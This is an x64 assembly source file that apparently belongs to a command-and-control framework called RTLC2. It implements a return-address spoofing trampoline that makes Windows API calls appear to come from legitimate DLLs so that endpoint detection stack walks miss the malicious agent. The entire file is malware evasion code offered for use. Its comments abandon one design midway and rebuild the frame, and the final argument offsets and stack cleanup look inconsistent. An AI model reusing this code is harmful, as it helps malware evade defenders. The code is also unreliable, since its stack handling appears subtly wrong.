/*
 * spoof_call.S - x64 Return Address Spoofing Trampoline
 *
 * Allows calling Windows API functions while making the call stack appear
 * to originate from a legitimate DLL (e.g., ntdll.dll or kernel32.dll)
 * instead of the agent's memory. This defeats stack-walking heuristics
 * used by EDR products to identify suspicious API call origins.
 *
 * The caller provides:
 *   - The real function to call
 *   - A "gadget" address (a `ret` or `add rsp, XX; ret` instruction
 *     inside a legitimate DLL) that will appear as the return address
 *   - The original arguments for the target function
 *
 * Calling Convention (from C):
 *   void* SpoofedCall(void* func, void* gadget, ...);
 *
 *   rcx  = pointer to target function
 *   rdx  = pointer to gadget (fake return address in legitimate DLL)
 *   r8   = arg1 for target function
 *   r9   = arg2 for target function
 *   [rsp+0x28] = arg3
 *   [rsp+0x30] = arg4
 *   [rsp+0x38] = arg5
 *   [rsp+0x40] = arg6
 *   etc.
 *
 * The function returns whatever the target function returns (in rax).
 *
 * Part of RTLC2 Phase 4: Advanced Evasion Techniques
 */

#ifdef RTLC2_WINDOWS
#ifdef _WIN64

.text
.intel_syntax noprefix

.global SpoofedCall
.type SpoofedCall, @function

SpoofedCall:
    /*
     * Prologue: save all callee-saved registers per Microsoft x64 ABI.
     * We need these because we're going to heavily manipulate the stack.
     *
     * Stack state on entry:
     *   [rsp]        = return address to our caller
     *   [rsp+0x08]   = shadow space (rcx home)
     *   [rsp+0x10]   = shadow space (rdx home)
     *   [rsp+0x18]   = shadow space (r8 home)
     *   [rsp+0x20]   = shadow space (r9 home)
     *   [rsp+0x28]   = arg3 (5th param)
     *   [rsp+0x30]   = arg4 (6th param)
     *   ...
     */
    push    rbx
    push    rsi
    push    rdi
    push    rbp
    push    r12
    push    r13
    push    r14
    push    r15
    sub     rsp, 0x08           /* Align stack to 16 bytes (8 pushes + sub = 72 bytes) */

    /* Save our real return address (we need it to return to the caller) */
    mov     r14, [rsp + 0x50]   /* return address: 8 pushes*8 + sub 8 + 8 = 0x50 */

    /* Save parameters */
    mov     r12, rcx            /* r12 = target function address */
    mov     r13, rdx            /* r13 = gadget address (fake return) */

    /*
     * Copy stack arguments (arg3, arg4, etc.) from our caller's frame
     * to the new frame we're building for the target function.
     *
     * Our caller placed extra args starting at [original rsp + 0x28].
     * After our pushes, that's at [rsp + 0x50 + 0x28] = [rsp + 0x78].
     *
     * We need to place them at [rsp + shadow] in the new frame.
     * We'll build the new frame below.
     */

    /* Allocate space for the target function call:
     *   0x20 = shadow space (32 bytes, required by x64 ABI)
     *   0x30 = space for up to 6 extra stack arguments
     *   0x08 = fake return address slot
     *   Total = 0x58
     */
    sub     rsp, 0x58

    /* Place the gadget as the "return address" for the target function.
     * When the target does `ret`, it will return to the gadget, not to us.
     * The gadget should be a simple `ret` instruction in a legitimate DLL.
     * This makes the call stack show: target <- gadget(in ntdll) <- ...
     */
    mov     [rsp], r13          /* fake return address */

    /* Set up the shadow space at [rsp+0x08] (target expects it there) */
    /* Copy arg3-arg8 from our caller's frame */
    /* arg3 is at [rsp + 0x58 + 0x50 + 0x28] = [rsp + 0xD0] in the original frame */
    mov     rax, [rsp + 0xD0]
    mov     [rsp + 0x28], rax   /* arg3 -> 5th slot */
    mov     rax, [rsp + 0xD8]
    mov     [rsp + 0x30], rax   /* arg4 -> 6th slot */
    mov     rax, [rsp + 0xE0]
    mov     [rsp + 0x38], rax   /* arg5 -> 7th slot */
    mov     rax, [rsp + 0xE8]
    mov     [rsp + 0x40], rax   /* arg6 -> 8th slot */
    mov     rax, [rsp + 0xF0]
    mov     [rsp + 0x48], rax   /* arg7 -> 9th slot */
    mov     rax, [rsp + 0xF8]
    mov     [rsp + 0x50], rax   /* arg8 -> 10th slot */

    /* Set up register arguments for the target function:
     *   r8  (from our caller) = arg1 for target -> rcx
     *   r9  (from our caller) = arg2 for target -> rdx
     *   Our caller's arg3 = target's arg3 -> r8
     *   Our caller's arg4 = target's arg4 -> r9
     */
    mov     rcx, r8             /* arg1 for target */
    mov     rdx, r9             /* arg2 for target */
    mov     r8,  [rsp + 0x28]   /* arg3 for target */
    mov     r9,  [rsp + 0x30]   /* arg4 for target */

    /*
     * Call the target function.
     * The stack currently looks like:
     *   [rsp+0x00] = gadget address (fake return)
     *   [rsp+0x08] = shadow[0]
     *   [rsp+0x10] = shadow[1]
     *   [rsp+0x18] = shadow[2]
     *   [rsp+0x20] = shadow[3]
     *   [rsp+0x28] = arg3
     *   ...
     *
     * When we `call r12`, the CPU pushes our return address onto the stack,
     * but the target function sees the frame starting at [rsp+8] after entry.
     * So we actually need to use `jmp` instead of `call` to avoid pushing
     * our own return address. But then we need a way to regain control.
     *
     * Solution: we set up the stack so that when target returns to the
     * gadget, the gadget's `ret` returns to our recovery trampoline.
     * But for simplicity, we use `call` and accept that our address appears
     * one frame deeper - which is OK because the immediate return address
     * (the one that matters for EDR stack walks) is the gadget.
     *
     * Actually, the correct approach: push our recovery label, then push
     * the gadget, then jmp to target. Target's ret goes to gadget,
     * gadget's ret goes to our recovery.
     */

    /* Adjust: we need to restructure. Instead of the above, we:
     * 1. Push recovery address
     * 2. The gadget is already at [rsp] from our setup above
     * But let's just use call for now; the spoofed return is gadget addr.
     * After the target returns, it goes to gadget which does `ret`,
     * which pops the next value on the stack. We need that to be our
     * recovery label. So:
     *   [rsp+0x00] = recovery_label   (gadget returns here)
     *   [rsp+0x08] = gadget            (target returns here)
     *   ... then shadow + args
     * But `call r12` pushes rip, making it:
     *   [rsp+0x00] = our_rip (from call)  -> target sees this as ret addr
     * That defeats the purpose.
     *
     * Correct approach: use jmp, with the stack set up properly.
     */

    /* Final stack layout before jmp r12:
     *   [rsp+0x00] = gadget (target's return address)
     *   [rsp+0x08] = recovery_label (gadget's return address)
     *   [rsp+0x10..0x2F] = shadow space
     *   [rsp+0x30+] = stack args
     */

    /* Rebuild the frame properly */
    add     rsp, 0x58           /* undo previous allocation */
    sub     rsp, 0x60           /* new allocation with room for recovery addr */

    /* Stack: [rsp] is the top */
    /* Place recovery label at [rsp+0x08] so gadget's ret pops it */
    lea     rax, [rip + .Lrecovery]
    mov     [rsp + 0x08], rax

    /* Place gadget at [rsp] - this is target's return address */
    mov     [rsp], r13

    /* Shadow space at [rsp+0x10] */
    /* Stack args start at [rsp+0x30] */
    /* Copy extra args from original frame */
    /* Original args at: rsp + 0x60 + 0x50 + 0x28 = rsp + 0xD8 */
    mov     rax, [rsp + 0xD8]
    mov     [rsp + 0x30], rax   /* arg3 */
    mov     rax, [rsp + 0xE0]
    mov     [rsp + 0x38], rax   /* arg4 */
    mov     rax, [rsp + 0xE8]
    mov     [rsp + 0x40], rax   /* arg5 */
    mov     rax, [rsp + 0xF0]
    mov     [rsp + 0x48], rax   /* arg6 */
    mov     rax, [rsp + 0xF8]
    mov     [rsp + 0x50], rax   /* arg7 */
    mov     rax, [rsp + 0x100]
    mov     [rsp + 0x58], rax   /* arg8 */

    /* Set register args */
    mov     rcx, r8             /* arg1 */
    mov     rdx, r9             /* arg2 */
    mov     r8,  [rsp + 0x30]   /* arg3 */
    mov     r9,  [rsp + 0x38]   /* arg4 */

    /* Jump to target function (no call, so no return address pushed).
     * Target sees [rsp] = gadget as its return address.
     * When target does `ret`, it goes to gadget.
     * Gadget does `ret`, it goes to .Lrecovery (at [rsp+0x08] after
     * target's ret popped gadget from stack). */
    jmp     r12

.Lrecovery:
    /* We're back. rax contains the return value from the target function. */
    /* Clean up the stack frame we allocated */
    add     rsp, 0x58           /* remove the frame (minus what ret consumed) */

    /* Restore callee-saved registers */
    add     rsp, 0x08           /* undo alignment sub */
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rbp
    pop     rdi
    pop     rsi
    pop     rbx

    ret

.size SpoofedCall, . - SpoofedCall

#endif /* _WIN64 */
#endif /* RTLC2_WINDOWS */
